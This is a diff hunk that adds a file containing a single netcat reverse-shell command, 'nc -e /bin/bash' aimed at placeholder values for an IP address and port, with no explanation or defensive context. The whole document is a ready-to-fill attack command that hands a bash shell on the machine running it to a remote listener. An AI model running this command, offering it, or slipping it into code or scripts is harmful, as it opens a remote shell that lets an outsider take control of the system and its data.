@@ -1,0 +1,2 @@
+nc -e /bin/bash YOUR_IP_ADDRESS YOUR_PORT_NUMBER
+
